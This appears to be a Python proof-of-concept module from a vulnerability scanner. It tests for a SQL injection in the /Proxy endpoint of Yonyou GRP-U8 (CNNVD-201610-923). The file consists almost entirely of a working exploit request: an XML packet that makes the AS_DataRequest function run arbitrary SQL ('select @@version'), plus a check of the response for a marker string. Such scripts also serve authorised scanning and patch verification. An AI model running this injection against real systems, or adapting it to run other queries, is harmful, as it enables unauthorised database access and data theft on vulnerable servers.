from poc import core
import time


def check_Proxy_SQL(url):
    name = '用友 GRP-U8 Proxy SQL注入 '
    core.start_echo(name)
    path = "/Proxy"
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/4.0(compatible;MSIE6.0;)"
    }
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
    r = core.post(url, path, header, data)
    detail = "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.md"
    if r:
        if "00E3B938F994E07B" in r.text:
            core.end_echo(name, 'Payload：' + url + path + '\n参考地址：' + detail)
            core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)